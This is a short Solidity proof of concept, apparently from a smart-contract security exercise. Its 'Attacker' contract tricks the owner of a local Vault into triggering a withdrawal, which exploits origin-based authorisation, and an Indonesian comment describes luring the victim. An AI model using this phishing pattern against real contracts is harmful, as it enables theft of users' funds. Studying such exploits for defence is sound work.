// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vault.sol";

contract Attacker {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    // owner korban akan "kepancing" manggil ini
    function trickWithdraw(uint256 amount) external {
        vault.withdraw(amount);
    }

    receive() external payable {}
}
